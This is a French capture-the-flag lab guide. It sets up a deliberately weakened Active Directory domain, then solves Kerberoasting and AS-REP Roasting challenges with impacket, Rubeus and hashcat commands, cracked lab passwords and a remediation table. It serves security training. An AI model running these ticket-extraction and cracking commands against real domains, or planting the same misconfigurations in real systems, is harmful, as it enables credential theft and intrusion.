# Flag 7b — Kerberoasting et AS-REP Roasting

> **Technique :** Kerberos Ticket Extraction + Offline Cracking
> **Machine de déploiement :** DC01
> **Machine d'exploitation :** Machine attaquante Linux (Kali/Parrot) ou WS01 avec RSAT
> **Compte de départ :** `CTF\lowpriv` / `User@1234`
> **Difficulté :** Intermédiaire / Avancé

---

## Déploiement

### Script — Flag7b-Kerberos.ps1

> [!warning] Lancer en PowerShell Admin sur DC01

```powershell
#Requires -RunAsAdministrator
Import-Module ActiveDirectory

$DomainDN = "DC=ctf,DC=local"

Write-Host "`n[FLAG 7b] Kerberoasting + AS-REP Roasting" -ForegroundColor Cyan

# --- 1. SPN sur svc-web (cible Kerberoasting) ---
$spns = (Get-ADUser -Identity "svc-web" -Properties ServicePrincipalNames).ServicePrincipalNames
if ("HTTP/intranet.ctf.local" -notin $spns) {
    Set-ADUser -Identity "svc-web" -ServicePrincipalNames @{
        Add = "HTTP/intranet.ctf.local","HTTP/intranet"
    }
    Write-Host "  [+] SPN enregistre : HTTP/intranet.ctf.local -> svc-web" -ForegroundColor Green
} else {
    Write-Host "  [~] SPN deja present sur svc-web" -ForegroundColor Gray
}

# --- 2. Desactiver la pre-auth sur svc-legacy (cible AS-REP Roasting) ---
Set-ADAccountControl -Identity "svc-legacy" -DoesNotRequirePreAuth $true
Write-Host "  [+] Pre-auth Kerberos desactivee sur svc-legacy" -ForegroundColor Green

# --- 3. Share WebAdmin -> flag apres Kerberoasting ---
$webPath = "C:\Shares\WebAdmin"
New-Item -ItemType Directory -Path $webPath -Force | Out-Null

if (Get-SmbShare -Name "WebAdmin" -ErrorAction SilentlyContinue) {
    Remove-SmbShare -Name "WebAdmin" -Force
}
New-SmbShare -Name "WebAdmin" -Path $webPath | Out-Null

$aclW = Get-Acl $webPath
$aclW.SetAccessRuleProtection($true, $false)
$aclW.Access | ForEach-Object { $aclW.RemoveAccessRule($_) | Out-Null }
foreach ($sid in @("S-1-5-18", "S-1-5-32-544")) {
    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
    $aclW.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
        $s, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
}
$aclW.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    "CTF\svc-web", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
Set-Acl -Path $webPath -AclObject $aclW
Set-Content "$webPath\flag7b-kerb.txt" -Value "FLAG{kerberoasting_svc_account_cracked}" -Encoding UTF8
Write-Host "  [+] Share \\DC01\WebAdmin cree (acces : svc-web)" -ForegroundColor Green

# --- 4. Share LegacyAdmin -> flag apres AS-REP Roasting ---
$legPath = "C:\Shares\LegacyAdmin"
New-Item -ItemType Directory -Path $legPath -Force | Out-Null

if (Get-SmbShare -Name "LegacyAdmin" -ErrorAction SilentlyContinue) {
    Remove-SmbShare -Name "LegacyAdmin" -Force
}
New-SmbShare -Name "LegacyAdmin" -Path $legPath | Out-Null

$aclL = Get-Acl $legPath
$aclL.SetAccessRuleProtection($true, $false)
$aclL.Access | ForEach-Object { $aclL.RemoveAccessRule($_) | Out-Null }
foreach ($sid in @("S-1-5-18", "S-1-5-32-544")) {
    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
    $aclL.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
        $s, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
}
$aclL.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    "CTF\svc-legacy", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
Set-Acl -Path $legPath -AclObject $aclL
Set-Content "$legPath\flag7b-asrep.txt" -Value "FLAG{asrep_roasting_no_preauth}" -Encoding UTF8
Write-Host "  [+] Share \\DC01\LegacyAdmin cree (acces : svc-legacy)" -ForegroundColor Green

# --- 5. Verifications ---
Write-Host "`n  [*] SPN svc-web :" -ForegroundColor Yellow
Get-ADUser -Identity "svc-web" -Properties ServicePrincipalNames |
    Select-Object -ExpandProperty ServicePrincipalNames

Write-Host "`n  [*] Pre-auth svc-legacy :" -ForegroundColor Yellow
Get-ADUser -Identity "svc-legacy" -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName, DoesNotRequirePreAuth

Write-Host "`n  [*] Flags :" -ForegroundColor Yellow
Get-Content "$webPath\flag7b-kerb.txt"
Get-Content "$legPath\flag7b-asrep.txt"

Write-Host "`n[FLAG 7b] DONE" -ForegroundColor Green
Write-Host "  SNAPSHOT : DC01 - Flag7b deploye" -ForegroundColor Yellow
```

---

### Vérification du déploiement

> [!warning] Depuis PowerShell Admin sur DC01

```powershell
# Verifier le SPN
Get-ADUser -Identity "svc-web" -Properties ServicePrincipalNames |
    Select-Object -ExpandProperty ServicePrincipalNames
# Attendu : HTTP/intranet.ctf.local

# Verifier AS-REP
Get-ADUser -Identity "svc-legacy" -Properties DoesNotRequirePreAuth |
    Select-Object DoesNotRequirePreAuth
# Attendu : True

# Verifier les shares
Get-SmbShare | Where-Object { $_.Name -match "WebAdmin|LegacyAdmin" } | Select-Object Name, Path
```

> [!success] Snapshot DC01
> **`DC01 — Flag7b déployé`**

---

## Write-up — Kerberoasting

### Contexte

Kerberoasting consiste à demander un ticket de service Kerberos (TGS) pour un compte ayant un SPN enregistré, puis à le cracker hors ligne. Tout utilisateur du domaine peut demander un TGS pour n'importe quel SPN. Le ticket est chiffré avec le hash NT du compte de service, ce qui permet de retrouver le mot de passe sans interaction supplémentaire avec le DC.

---

### Reconnaissance

#### Étape 1 — Lister les comptes avec SPN

Connecté en `CTF\lowpriv` sur WS01 :

```powershell
Get-ADUser -Filter { ServicePrincipalNames -ne "$null" } `
    -Properties ServicePrincipalNames |
    Select-Object SamAccountName, ServicePrincipalNames
```

**Résultat :**

```
SamAccountName  ServicePrincipalNames
--------------  ---------------------
svc-web         {HTTP/intranet.ctf.local, HTTP/intranet}
```

Depuis Linux :

```bash
impacket-GetUserSPNs ctf.local/lowpriv:User@1234 -dc-ip 192.168.10.10
```

---

### Exploitation

#### Étape 2 — Extraire le ticket TGS

Depuis Linux :

```bash
impacket-GetUserSPNs ctf.local/lowpriv:User@1234 -dc-ip 192.168.10.10 \
    -request -outputfile kerb_hashes.txt
cat kerb_hashes.txt
```

**Résultat :**

```
$krb5tgs$23$*svc-web$CTF.LOCAL$HTTP/intranet.ctf.local*$AABBCC...
```

Depuis Windows avec Rubeus :

```powershell
.\Rubeus.exe kerberoast /output:kerb_hashes.txt
```

#### Étape 3 — Cracker le hash hors ligne

```bash
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Résultat :**

```
$krb5tgs$23$*svc-web*...: Svc!Web2024
```

#### Étape 4 — Accéder au share avec les credentials crackés

```powershell
net use W: \\DC01\WebAdmin /user:CTF\svc-web Svc!Web2024
Get-Content W:\flag7b-kerb.txt
net use W: /delete
```

---

### Récupération du flag — Kerberoasting

```
FLAG{kerberoasting_svc_account_cracked}
```

---

## Write-up — AS-REP Roasting

### Contexte

AS-REP Roasting cible les comptes pour lesquels la pré-authentification Kerberos est désactivée. Sans cette protection, n'importe qui peut demander un AS-REP chiffré avec le hash du compte sans s'authentifier au préalable. Le hash peut ensuite être cracké hors ligne.

---

### Reconnaissance

#### Étape 1 — Identifier les comptes sans pré-auth

```powershell
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } `
    -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName
```

**Résultat :**

```
SamAccountName
--------------
svc-legacy
```

---

### Exploitation

#### Étape 2 — Extraire le hash AS-REP

Depuis Linux :

```bash
impacket-GetNPUsers ctf.local/lowpriv:User@1234 -dc-ip 192.168.10.10 -request
```

**Résultat :**

```
$krb5asrep$23$svc-legacy@CTF.LOCAL:AABBCC...
```

#### Étape 3 — Cracker le hash

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Résultat :**

```
$krb5asrep$23$svc-legacy...: Legacy123
```

#### Étape 4 — Accéder au share

```powershell
net use L: \\DC01\LegacyAdmin /user:CTF\svc-legacy Legacy123
Get-Content L:\flag7b-asrep.txt
net use L: /delete
```

---

### Récupération du flag — AS-REP Roasting

```
FLAG{asrep_roasting_no_preauth}
```

---

### Remédiation

| Problème | Correction |
|---|---|
| SPN sur compte avec mot de passe faible | Utiliser des gMSA (Group Managed Service Accounts) avec mots de passe 120 caractères auto-générés |
| Pré-auth Kerberos désactivée | Réactiver sur tous les comptes sauf contrainte de compatibilité documentée |
| Mot de passe de service dans rockyou | Politique : mots de passe de service ≥ 25 caractères aléatoires |
| Pas de détection | Alerter sur les demandes massives de TGS ou AS-REP sans authentification |

---

### Résumé de la chaîne d'exploitation

```
lowpriv
  ├─→ KERBEROASTING
  │     └─→ Get-ADUser → svc-web a SPN HTTP/intranet.ctf.local
  │           └─→ GetUserSPNs → TGS chiffré avec hash NT de svc-web
  │                 └─→ hashcat -m 13100 → Svc!Web2024
  │                       └─→ net use \\DC01\WebAdmin → FLAG{kerberoasting_svc_account_cracked}
  │
  └─→ AS-REP ROASTING
        └─→ Get-ADUser DoesNotRequirePreAuth → svc-legacy
              └─→ GetNPUsers → AS-REP chiffré sans authentification
                    └─→ hashcat -m 18200 → Legacy123
                          └─→ net use \\DC01\LegacyAdmin → FLAG{asrep_roasting_no_preauth}
```
